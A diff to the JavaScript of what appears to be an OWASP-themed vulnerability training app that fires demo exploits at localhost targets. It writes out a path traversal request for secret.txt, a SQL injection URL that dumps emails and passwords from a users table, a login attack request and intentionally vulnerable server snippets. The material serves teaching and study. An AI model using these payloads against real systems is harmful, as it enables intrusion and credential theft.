@@ -14,10 +14,10 @@ const exploitData = {
   } else {
     res.sendFile(path.join(__dirname, 'public', 'failed.html'));
   }`,
-    url: "http://localhost:3000/login",
+    url: "http://localhost:3001/login",
     secure: `Secure version not yet implemented`,
     successful_substring: "Login Successful!",
-    attack_request: `await fetch('http://localhost:3000/login', {
+    attack_request: `await fetch('http://localhost:3001/login', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -30,7 +30,7 @@ const exploitData = {
   },
   "Insecure Design": {
     vulnerable: `Not yet implemented`,
-    url: "http://localhost:3000/bank",
+    url: "http://localhost:3001/bank",
     secure: `Secure version not yet implemented`,
     successful_substring: "secret",
     attack_request: "???",
@@ -45,17 +45,17 @@ const exploitData = {
       } else {
           res.send("File at " + filePath + " doesn't exist.");
       }`,
-    url: "http://localhost:3000/pathtraversal",
+    url: "http://localhost:3001/pathtraversal",
     secure: `Secure version not yet implemented`,
     successful_substring: "secret",
-    attack_request: "http://localhost:3000/pathtraversal/..%2F..%2F..%2Fsecret.txt",
+    attack_request: "http://localhost:3001/pathtraversal/..%2F..%2F..%2Fsecret.txt",
     custom_behavior: false,
     server_side_exploit: true,
     documentation_html_filepath: "placeholder.html"
   },
   "Software and Data Integrity Failures": {
     vulnerable: `??????????????`,
-    url: "http://localhost:3001/#/search?q=advanced",
+    url: "http://localhost:3000/#/search?q=advanced",
     secure: `Secure version not yet implemented`,
     successful_substring: "secret",
     attack_request: "????????",
@@ -65,10 +65,10 @@ const exploitData = {
   },
   "Security Logging and Monitoring Failures": {
     vulnerable: `??????????????`,
-    url: "http://localhost:3001/rest/products/search?q=",
+    url: "http://localhost:3000/rest/products/search?q=",
     secure: `Secure version not yet implemented`,
     successful_substring: "secret",
-    attack_request: "window.location.href = 'http://localhost:3001/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'",
+    attack_request: "window.location.href = 'http://localhost:3000/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'",
     custom_behavior: true,
     server_side_exploit: false,
     documentation_html_filepath: "placeholder.html"
@@ -102,7 +102,6 @@ async function sendExploit() {
       });
       if (response.ok) {
         const result = await response.text();
-        alert(result)
 
         if (exploitData[selectedExploit].custom_behavior == true) {
           if (selectedExploit == "Software and Data Integrity Failures") {
@@ -131,7 +130,7 @@ async function sendExploit() {
       
       if (exploitData[selectedExploit].custom_behavior == true) {
         if (selectedExploit == "Security Logging and Monitoring Failures") {
-          let url = 'http://localhost:3001/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'
+          let url = 'http://localhost:3000/rest/products/search?q=%27))%20union%20select%20id,email,password,4,5,6,7,8,9%20from%20users--'
           urlbar.value = url
           iframe.src = url
         }
@@ -144,7 +143,7 @@ async function sendExploit() {
       const timeout = 5000;
       let elapsedTime = 0;
 
-      const intervalId = setInterval(() => {
+      const intervalId = setTimeout(() => {
         const result = iframe.contentWindow.document.body.innerText;
 
         if (result.includes(exploitData[selectedExploit].successful_substring)) {
